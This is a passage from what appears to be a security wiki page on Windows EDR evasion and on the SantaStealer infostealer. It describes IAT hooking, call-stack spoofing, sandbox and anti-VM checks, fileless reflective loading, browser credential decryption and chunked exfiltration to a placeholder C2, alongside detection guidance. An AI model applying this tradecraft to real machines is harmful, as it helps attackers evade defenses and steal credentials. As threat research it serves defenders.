// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Remarques
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Intégration opérationnelle
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Considérations Detection/DFIR
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Blocs et exemples connexes
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustre comment les info-stealers modernes mélangent AV bypass, anti-analysis et credential access dans un seul workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logique en couches de `check_antivm`

- Variant A parcourt la liste des processus, hache chaque nom avec un checksum roulant personnalisé, et les compare à des blocklists intégrées pour débogueurs/sandboxes ; il répète le checksum sur le nom de l'ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- Variant B inspecte les propriétés du système (seuil minimal du nombre de processus, uptime récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox, et effectue des contrôles de temporisation autour des sleeps pour repérer le single-stepping. Toute détection interrompt l'exécution avant le lancement des modules.

### Fileless helper + double ChaCha20 reflective loading

- Le DLL/EXE principal embarque un Chromium credential helper qui est soit déposé sur le disque soit mappé manuellement en mémoire ; en mode fileless il résout lui-même les imports/relocations de sorte qu'aucun artefact d'helper n'est écrit.
- Cet helper stocke une DLL de second stade chiffrée deux fois avec ChaCha20 (deux clés de 32 octets + nonces de 12 octets). Après les deux passes, il charge reflectively le blob (pas de `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Les routines ChromElevator utilisent direct-syscall reflective process hollowing pour s'injecter dans un navigateur Chromium vivant, hériter des clés AppBound Encryption, et déchiffrer mots de passe/cookies/cartes de crédit directement depuis les bases SQLite malgré le durcissement ABE.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` itère une table globale de pointeurs de fonction `memory_generators` et lance un thread par module activé (Telegram, Discord, Steam, captures d'écran, documents, extensions de navigateur, etc.). Chaque thread écrit les résultats dans des buffers partagés et rapporte son nombre de fichiers après une fenêtre de jonction d'environ 45 s.
- Une fois terminé, tout est compressé avec la librairie statiquement liée `miniz` en `%TEMP%\\Log.zip`. `ThreadPayload1` dort ensuite 15 s et stream l'archive en chunks de 10 MB via HTTP POST vers `http://<C2>:6767/upload`, usurpant une boundary `multipart/form-data` de navigateur (`----WebKitFormBoundary***`). Chaque chunk ajoute `User-Agent: upload`, `auth: <build_id>`, optionnellement `w: <campaign_tag>`, et le dernier chunk ajoute `complete: true` pour que le C2 sache que la réassemblage est terminé.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
